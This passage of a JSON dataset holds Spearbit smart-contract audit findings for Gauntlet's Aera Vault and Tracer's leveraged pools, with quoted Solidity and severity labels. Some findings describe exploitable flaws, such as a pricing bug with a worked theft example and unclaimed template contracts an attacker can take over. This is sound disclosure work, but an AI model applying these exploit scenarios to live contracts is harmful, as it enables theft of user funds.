        "body": "The Owner and Manager roles are separated on purpose. Role separation usually helps to improve quality. However this separation can be broken if the Owner calls setManager(). This way the Owner can set the Manager to one of his own addresses, do Manager functions (for example setSwapFee()) and perhaps set it back to the Manager. Note: as everything happens on chain these actions can be tracked. function setManager(address newManager) external override onlyOwner { if (newManager == address(0)) { revert Aera__ManagerIsZeroAddress(); } if (initialized && noticeTimeoutAt == 0) { calculateAndDistributeManagerFees(); } emit ManagerChanged(manager, newManager); manager = newManager; }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add modifier whenInitialized to function finalize()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The function finalize() does not have the modifier whenInitialized while most other functions have this modifier. This does not create any real issues because the function contains the check noticeTimeoutAt == 0 which can only be skipped after initiateFinalization(), and this function does have the whenInitialized modifier. function finalize() external override nonReentrant onlyOwner { // no modifier whenInitialized if (noticeTimeoutAt == 0) { // can only be set via initiateFinalization() revert Aera__FinalizationNotInitialized(); } ... }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the use of mustAllowlistLPs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "In the Mannon Vault it is important that no other accounts can use joinPool() on the balancer pool. If other accounts are able to call joinPool(), they would get Balancer Pool Tokens (BPT) which could rise in value once more funds are added to the pool. Luckily this is prevented by the mustAllowlistLPs parameter in NewPoolParams. Readers could easily overlook this parameter. pool = IBManagedPool( IBManagedPoolFactory(factory).create( IBManagedPoolFactory.NewPoolParams({ vault: IBVault(address(0)), name: name, symbol: symbol, tokens: tokens, normalizedWeights: weights, assetManagers: managers, swapFeePercentage: swapFeePercentage, pauseWindowDuration: 0, bufferPeriodDuration: 0, owner: address(this), swapEnabledOnStart: false, mustAllowlistLPs: true, managementSwapFeePercentage: 0 // prevent other account to use joinPool }) ) );",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "finalize can be called multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The finalize function can be called multiple time, leading to the possibility to waste gas for no reason and emitting again a conceptually wrong Finalized event. Currently, theres no check that will prevent to call the function multiple time and there is no explicit flag to allow external sources (web app, external contract) to know whether the AeraVault has been finalized or not. Scenario: the AeraVault has already been finalized but the owner (that could be a contract and not a single EOA) is not aware of it. He calls finalize again and wastes gas because of the external calls in a loop done in returnFunds and emit an additional event Finalized(owner(), [0, 0, ..., 0]) with an array of zeros in the amounts event parameter.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider updating finalize to have a more \"clean\" final state for the AeraVault/Balancer pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "This is just a suggestion and not an issue per se. The finalize function should ensure that the pool is in a finalized state for both a better UX and DX. Currently, the finalize function is only withdrawing all the funds from the pool after a noticePeriod but is not ensuring that the swap have been disabled and that all the rewards, entitled to the Vault (owned by the Treasury), have been claimed.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "enableTradingWithWeights is not emitting an event for pools weight change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "enableTradingWithWeights is both changing the pools weight and enabling the swap feature, but its only emitting the swap related event (done by calling setSwapEnabled). Both of those operations should be correctly tracked via events to be monitored by external tools.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document Balancer checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancer has a large number of internal checks. Weve discussed the use of additional checks in the Aera Vault functions. The advantage of this is that it could result in more user friendly error messages. Additionally it protects against potential future change in the Balancer code. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { function enableTradingWithWeights(uint256[] calldata weights) ... { { ... // doesn't check weights.length pool.updateWeightsGradually(timestamp, timestamp, weights); ... } } Balancer code: function updateWeightsGradually( ..., uint256[] memory endWeights) ... { (IERC20[] memory tokens, , ) = getVault().getPoolTokens(getPoolId()); ... InputHelpers.ensureInputLengthMatch(tokens.length, endWeights.length); // length check is here ... }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename FinalizationInitialized to FinalizationInitiated for code consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The function at L517 was renamed from initializeFinalization to initiateFinalization to avoid confusion with the Aera vault initialization. For code consistency, the corresponding event and error names should be changed.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider enforcing an explicit check on token order to avoid human error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Balancer protocol require (and enforce during the pool creation) that the pools token must be ordered by the token address. The following functions accept an uint256[] of amounts or weights without knowing if the order inside that array follow the same order of the tokens inside the Balancer pool.  initialDeposit  deposit  withdraw  enableTradingWithWeights  updateWeightsGradually While its impossible to totally prevent the human error (they could specify the correct token order but wrongly swap the input order of the amount/weight) we could force the user to be more aware of the specific order in which the amounts/weights must be specified. A possible solution applied to the initialDeposit as an example could be: 37 function initialDeposit(IERC20[] calldata tokensSorted, uint256[] calldata amounts) external override onlyOwner { // ... other code IERC20[] memory tokens = getTokens(); // check that also the tokensSorted length match the lenght of other arrays if (tokens.length != amounts.length || tokens.length != tokensSorted.length) { revert Aera__AmountLengthIsNotSame( tokens.length, amounts.length ); } // ... other code for (uint256 i = 0; i < tokens.length; i++) { // check that the token position associated to the amount has the same position of the one in ,! the balancer pool if( address(tokens[i]) != address(tokensSorted[i]) ) { revert Aera__TokenOrderIsNotSame( address(tokens[i]), address(tokensSorted[i]), i ); } depositToken(tokens[i], amounts[i]); } // ... other code } Another possible implementation would be to introduce a custom struct struct TokenAmount { IERC20 token; uint256 value; } Update the function signature function initialDeposit(TokenAmount[] calldata tokenWithAmount) and up- date the example code following the new parameter model. Its important to note that while this solution will not completely prevent the human error, it will increase the gas consumption of each function.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Swap is not enabled after initialDeposit execution",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "In the current deployment flow of the AeraVault the Balancer pool is created (by the constructor) with swapEnabledOnStart set as false. When the pool receives their initial funds via initialDeposit the pool has still the swap functionality disabled. It is not explicitly clear in the specification document and in the code when the swap functionality should be enabled. If the protocol wants to enable the swap as soon as the funds are deposited in the pool, they should call, after bVault.joinPool(...), setSwapEnabled(true) or enableTradingWithWeights(uint256[] calldata weights) in case the external spot price is not aligned (both functions will also trigger a SetSwapEnabled event)",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove commented code and replace input values with Balancer enum",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Inside initialDeposit function, there is some commented code (used as example) that should be removed for clarity and future confusion. The initUserData should not use direct input values (0 in this case) but use the correct Balancers enum value to avoid any possible confusion. Following the Balancer documentation  Encoding userData  JoinKind The correct way to declare initUserData is using the WeightedPoolUserData.JoinKind.INIT enum value.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "The Created event is not including all the information used to deploy the Balancer pool and are missing indexed properties",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The current Created event is defined as 39 event Created( address indexed factory, IERC20[] tokens, uint256[] weights, address manager, address validator, uint32 noticePeriod, string description ); And is missing some of the information that are used to deploy the pool. To allow external tools to better monitor the deployment of the pools, it should be better to include all the information that have been used to deploy the pool on Balancer. The following information is currently missing from the event definition:  name  symbol  managementFee  swapFeePercentage The event could also define both manager and validator as indexed event parameters to allow external tools to filter those events by those values.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename temp variable managers to assetManagers to avoid confusions and any potential future mistakes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The managers declared in the linked code (see context) are in reality Asset Manager that have a totally different role compared to the AeraVault Manager role. The AssetManager is able to control the pools balance, withdrawing from it or depositing into it. To avoid confusion and any potential future mistakes, it should be better to rename the temporary variable managers to a more appropriate name like assetManagers. - address[] memory managers = new address[](tokens.length); + address[] memory assetManagers = new address[](tokens.length); for (uint256 i = 0; i < tokens.length; i++) { - + } managers[i] = address(this); assetManagers[i] = address(this); pool = IBManagedPool( IBManagedPoolFactory(factory).create( - + IBManagedPoolFactory.NewPoolParams({ vault: IBVault(address(0)), name: name, symbol: symbol, tokens: tokens, normalizedWeights: weights, assetManagers: managers, assetManagers: assetManagers, swapFeePercentage: swapFeePercentage, pauseWindowDuration: 0, bufferPeriodDuration: 0, owner: address(this), swapEnabledOnStart: false, mustAllowlistLPs: true, managementSwapFeePercentage: 0 }) ) ); 41",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move description declaration inside the storage slot code block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "In the current code, the description state variable is in the block of /// STORAGE /// where all the immutable variable are re-grouped. As the dev comment say, string cannot be immutable bytecode but only set in constructor so it would be better to move it inside the /// STORAGE SLOT START /// block of variables that regroup all the non-constant and non-immutable state variables.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused imports from code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The current implementation of the AeraVaultV1 contract is importing OpenZeppelin IERC165 inter- face, but that interface is never used or references in the code.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "shortfall is repeated twice in IWithdrawalValidator natspec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The word shortfall is repeated twice in the natspec comment.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Provide definition of weights & managementFee_ in the NatSpec comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The NatSpec Format is special form of comments to provide rich documentation for functions, return variables and more. We observed an occurrence where the NatSpec comments are missing for two of the user inputs (weights & managementFee_).",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Pool token price is incorrect when there is more than one pending upkeep",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The amount of pool tokens to mint and quote tokens to burn is determined by the pool token price. This price, for a commit at update interval ID X, should not be influenced by any pending commits for IDs greater than X. However, in the current implementation price includes the current total supply but burn commits burn pool tokens immediately when commit() is called, not when upkeep() is executed. // pool token price computation at execution of updateIntervalId, example for long price priceHistory[updateIntervalId].longPrice = longBalance / (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[updateIntervalId].longBurnAmount + _totalCommit[updateIntervalId].longBurnShortMintAmount) ,! The implementation tries to fix this by adding back all tokens burned at this updateIntervalId but it must also add back all tokens that were burned in future commits (i.e. when ID > updateIntervalID). This issue allows an attacker to get a better pool token price and steal pool token funds. Example: Given the preconditions:  long.totalSupply() = 2000  User owns 1000 long pool tokens  lastPriceTimestamp = 100  updateInterval = 10  frontRunningInterval = 5 At time 104: User commits to BurnLong 500 tokens in appropriateUpdateIntervalId = 5. Upon execution user receives a long price of longBalance / (1500 + 500) if no further future commitments are made. Then, as tokens are burned totalPoolCommitments[5].longBurnAmount = 500 and long.totalSupply -= 500. time 106: At 6 as they are now past totalPoolCommitments[6].longBurnAmount = 500, long.totalSupply -= 500 again as tokens are burned. User commits another 500 tokens to BurnLong at appropriateUpdateIntervalId = Now the frontRunningInterval and are scheduled for the next update. the 5th update interval Finally, (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[5].longBurnAmount + _totalCom- mit[5].longBurnShortMintAmount = longBalance / (1000 + 500) which is a better price than what the user should have received. ID is executed by the pool keeper but at longPrice = longBalance / With a longBalance of 2000, the user receives 500 * (2000 / 1500) = 666.67 tokens executing the first burn commit and 500 * ((2000 - 666.67) / 1500) = 444.43 tokens executing the second one. 5 The total pool balance received by the user is 1111.1/2000 = 55.555% by burning only 1000 / 2000 = 50% of the pool token supply.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Critical"
        ]
    },
    {
        "title": "No price scaling in SMAOracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The update() function of the SMAOracle contract doesnt scale the latestPrice although a scaler is set in the constructor. On the other hand, the _latestRoundData() function of ChainlinkOracleWrapper contract does scale via toWad(). contract SMAOracle is IOracleWrapper { constructor(..., uint256 _spotDecimals, ...) { ... require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); ... /* `scaler` is always <= 10^18 and >= 1 so this cast is safe */ scaler = int256(10**(MAX_DECIMALS - _spotDecimals)); ... } function update() internal returns (int256) { /* query the underlying spot price oracle */ IOracleWrapper spotOracle = IOracleWrapper(oracle); int256 latestPrice = spotOracle.getPrice(); ... priceObserver.add(latestPrice); // doesn't scale latestPrice ... } contract ChainlinkOracleWrapper is IOracleWrapper { function getPrice() external view override returns (int256) { (int256 _price, ) = _latestRoundData(); return _price; } function _latestRoundData() internal view returns (int256, uint80) { (..., int256 price, ..) = AggregatorV2V3Interface(oracle).latestRoundData(); ... return (toWad(price), ...); }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Two different invariantCheck variables used in PoolFactory.deployPool()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The deployPool() function in the PoolFactory contract uses two different invariantCheck vari- ables: the one defined as a contracts instance variable and the one supplied as a parameter. Note: This was also documented in Secureums CARE-X report issue \"Invariant check incorrectly fixed\". function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... poolCommitter.initialize(..., ,! invariantCheck deploymentParameters.invariantCheck, ... ); // version 1 of ... ILeveragedPool.Initialization memory initialization = ILeveragedPool.Initialization({ ... _invariantCheckContract: invariantCheck, // version 2 of invariantCheck ... });",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Duplicate user payments for long commits when paid from balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "When minting pool tokens in commit(), the fromAggregateBalance parameter indicates if the user wants to pay from their internal balances or by transferring the tokens. The second if condition is wrong and leads to users having to pay twice when calling commit() with CommitType.LongMint and fromAggregateBalance = true.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Initial executionPrice is too high",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "When a pool is deployed the initial executionPrice is calculated as firstPrice * 1e18 where firstPrice is ILeveragedPool(_poolAddress).getOraclePrice(): contract PoolKeeper is IPoolKeeper, Ownable { function newPool(address _poolAddress) external override onlyFactory { int256 firstPrice = ILeveragedPool(_poolAddress).getOraclePrice(); int256 startingPrice = ABDKMathQuad.toInt(ABDKMathQuad.mul(ABDKMathQuad.fromInt(firstPrice), ,! FIXED_POINT)); executionPrice[_poolAddress] = startingPrice; } } All other updates to executionPrice use the result of getPriceAndMetadata() directly without scaling: function performUpkeepSinglePool() { ... (int256 latestPrice, ...) = pool.getUpkeepInformation(); ... executionPrice[_pool] = latestPrice; ... } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function getUpkeepInformation() { (int256 _latestPrice, ...) = IOracleWrapper(oracleWrapper).getPriceAndMetadata(); return (_latestPrice, ...); } } The price after the firstPrice will always be lower, therefore its funding rate payment will always go to the shorts and long pool token holders will incur a loss.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Paused state cant be set and therefore withdrawQuote() cant be executed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The checkInvariants() function of the InvariantCheck contract is called via the modifiers check- InvariantsBeforeFunction() and checkInvariantsAfterFunction() of both LeveragedPool and PoolCommit- ter contracts, and it is meant to pause the contracts if the invariant checks dont hold. The aforementioned modifiers also contain the require(!paused, \"Pool is paused\"); statement, which reverts the entire transaction and resets the paused variable that was just set. Furthermore, the paused state can only be set by the InvariantCheck contract due to the onlyInvariantCheck- Contract modifier. Thus the paused variable will never be set to true, making withdrawQuote() impossible to be executed because it requires the contract to be paused. This means that the quote tokens will always stay in the pool even if invariants dont hold and all other actions are blocked. Relevant parts of the code: The checkInvariants() function calls InvariantCheck.pause() if the invariants dont hold. The latter calls pause() in LeveragedPool and PoolCommitter: contract InvariantCheck is IInvariantCheck { function checkInvariants(address poolToCheck) external override { ... pause(IPausable(poolToCheck), IPausable(address(poolCommitter))); ... } function pause(IPausable pool, IPausable poolCommitter) internal { pool.pause(); poolCommitter.pause(); } } In LeveragedPool and PoolCommitter contracts, the checkInvariantsBeforeFunction() and checkIn- variantsAfterFunction() modifiers will make the transaction revert if checkInvariants() sets the paused state. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external override onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); } ,! } 9 contract PoolCommitter is IPoolCommitter, Initializable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The value of lastExecutionPrice fails to update if pool.poolUpkeep() reverts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The performUpkeepSinglePool() function of the PoolKeeper contract updates executionPrice[] with the latest price and calls pool.poolUpkeep() to process the price difference. However, pool.poolUpkeep() can revert, for example due to the checkInvariantsBeforeFunction modifier in mintTokens(). If pool.poolUpkeep() reverts then the previous price value is lost and the processing will not be accurate. There- fore, it is safer to store the new price only if pool.poolUpkeep() has been executed succesfully. function performUpkeepSinglePool(...) public override { ... int256 lastExecutionPrice = executionPrice[_pool]; executionPrice[_pool] = latestPrice; ... try pool.poolUpkeep(lastExecutionPrice, latestPrice, _boundedIntervals, _numberOfIntervals) { // previous price can get lost if poolUpkeep() reverts ... // executionPrice[_pool] should be updated here } catch Error(string memory reason) { ... } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Pools can be deployed with malicious or incorrect quote tokens and oracles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The deployment of a pool via deployPool() is permissionless. The deployer provides several pa- rameters that have to be trusted by the users of a specific pool, these parameters include:  oracleWrapper  settlementEthOracle  quoteToken  invariantCheck If any one of them is malicious, then the pool and its value will be affected. Note: Separate findings are made for the deployer check (issue Authenticity check for oracles is not effective) and the invariantCheck (issue Two different invariantCheck variables used in PoolFactory.deployPool() ).",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "pairTokenBase and poolBase template contracts instances are not initialized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The constructor of PoolFactory contract creates three template contract instances but only one is initialized: poolCommitterBase. The other two contract instances (pairTokenBase and poolBase) are not initial- ized. contract PoolFactory is IPoolFactory, Ownable { constructor(address _feeReceiver) { ... PoolToken pairTokenBase = new PoolToken(DEFAULT_NUM_DECIMALS); // not initialized pairTokenBaseAddress = address(pairTokenBase); LeveragedPool poolBase = new LeveragedPool(); // not initialized poolBaseAddress = address(poolBase); PoolCommitter poolCommitterBase = new PoolCommitter(); // is initialized poolCommitterBaseAddress = address(poolCommitterBase); ... /* initialise base PoolCommitter template (with dummy values) */ poolCommitterBase.initialize(address(this), address(this), address(this), owner(), 0, 0, 0); } This means an attacker can initialize the templates setting them as the owner, and perform owner actions on contracts such as minting tokens. This can be misleading for users of the protocol as these minted tokens seem to be valid tokens. In PoolToken.initialize() an attacker can become the owner by calling initialize() with an address under his control as a parameter. The same can happen in LeveragedPool.initialize() with the initialization parameter. 13 contract PoolToken is ERC20_Cloneable, IPoolToken { ... } contract ERC20_Cloneable is ERC20, Initializable { function initialize(address _pool, ) external initializer { // not called for the template contract owner = _pool; ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! // not called for the template contract ... // set the owner of the pool. This is governance when deployed from the factory governance = initialization._owner; } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Oracles are not updated before use",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The PoolKeeper contract uses two oracles but does not ensure that their prices are updated. The poll() function should be called on both oracles to get the first execution and the settlement / ETH prices. As it currently is, the code could operate on old data.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getPendingCommits() underreports commits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "When frontRunningInterval > updateInterval, the PoolCommitter.getAppropriateUpdateIntervalId() function can return updateInterval IDs that are arbitrarily far into the future, especially if appropriateIntervalId > updateIntervalId + 1. Therefore, commits can also be made to these appropriate interval IDs far in the future by calling commit(). The PoolCommitter.getPendingCommits() function only checks the commits for updateIntervalId and updateIn- tervalId + 1, but needs to check up to updateIntervalId + factorDifference + 1. Currently, it is underreporting the pending commits which leads to the checkInvariants function not checking the correct values.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Authenticity check for oracles is not effective",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The deployPool() function verifies the authenticity of the oracleWrapper by calling its deployer() function. As the oracleWrapper is supplied via deploymentParameters, it can be a malicious contract whose deployer() function can return any value, including msg.sender. Note: this check does protect against frontrunning the deployment transaction of the same pool. See Undocu- mented frontrunning protection. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\");",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect calculation of keeper reward",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The keeper reward is calculated as (keeperGas * tipPercent / 100) / 1e18. The division by 1e18 is incorrect and undervalues the reward for the keeper. The tip part of the keeper reward is essentially ignored. The likely cause of this miscalculation is based on the note at PoolKeeper.sol#244 which states the tip percent is in WAD units, but it really is a quad representation of a value in the range between 5 and 100. The comment at PoolKeeper.sol#L241 also incorrectly states that _keeperGas is in wei (usually referring to ETH), which is not the case as it is denominated in the quote token, but in WAD precision.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "performUpkeepSinglePool() can result in a griefing attack when the pool has not been updated for many intervals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. This in turn will call executeCommitments() repeatedly. For each call to executeCommitments() the updateMintingFee() function will be called. This updates fees and changes them in an unexpected way. A griefing attack is possible by repeatedly calling executeCommitments() with boundedIntervals == true and numberOfIntervals == 0. Note: Also see issue It is not possible to call executeCommitments() for multiple old commits. It is also important that lastPriceTimestamp is only updated after the last executeCommitments(), otherwise it will revert. 17 function executeCommitments(bool boundedIntervals, uint256 numberOfIntervals) external override ,! onlyPool { ... uint256 upperBound = boundedIntervals ? numberOfIntervals : type(uint256).max; ... while (i < upperBound) { if (block.timestamp >= lastPriceTimestamp + updateInterval * counter) { // ,! lastPriceTimestamp shouldn't be updated too soon ... } } ... updateMintingFee(); // should do this once (in combination with _boundedIntervals==true) ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "It is not possible to call executeCommitments() for multiple old commits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. In this context the following problem occurs:  In the first run of poolUpkeep(), lastPriceTimestamp will be set to block.timestamp.  In the next run of poolUpkeep(), processing will stop at require(intervalPassed(),..), because block.timestamp hasnt increased. This means the rest of the commitments wont be executed by executeCommitments() and updateIntervalId, which is updated in executeCommitments(), will start lagging. 18 function poolUpkeep(..., bool _boundedIntervals, uint256 _numberOfIntervals) external override ,! onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); // next time lastPriceTimestamp == ,! block.timestamp executePriceChange(_oldPrice, _newPrice); // should only to this once (in combination with ,! _boundedIntervals==true) IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); lastPriceTimestamp = block.timestamp; // shouldn't update until all executeCommitments() are ,! processed } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect comparison in getUpdatedAggregateBalance()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "When the value of data.updateIntervalId accidentally happens to be larger data.currentUpdateIntervalId in the getUpdatedAggregateBalance() function, it will execute the rest of the function, which shouldnt happen. Although this is unlikely it is also very easy to prevent. function getUpdatedAggregateBalance(UpdateData calldata data) external pure returns (...) { if (data.updateIntervalId == data.currentUpdateIntervalId) { // Update interval has not passed: No change return (0, 0, 0, 0, 0); } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "updateAggregateBalance() can run out of gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The updateAggregateBalance() function of the PoolCommitter contract contains a for loop that, in theory, could use up all the gas and result in a revert. The updateAggregateBalance() function checks all future intervals every time it is called and adds them back to the unAggregatedCommitments array, which is checked in the next function call. This would only be a problem if frontRunningInterval is much larger than updateInterval, a situation that seems unlikely in practice. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... uint256[] memory currentIntervalIds = unAggregatedCommitments[user]; uint256 unAggregatedLength = currentIntervalIds.length; for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; ... UserCommitment memory commitment = userCommitments[user][id]; ... if (commitment.updateIntervalId < updateIntervalId) { ... } else { ... storageArrayPlaceHolder.push(currentIntervalIds[i]); // entry for future intervals stays ,! in array } } delete unAggregatedCommitments[user]; unAggregatedCommitments[user] = storageArrayPlaceHolder; ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Pool information might be lost if setFactory() of PoolKeeper contract is called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
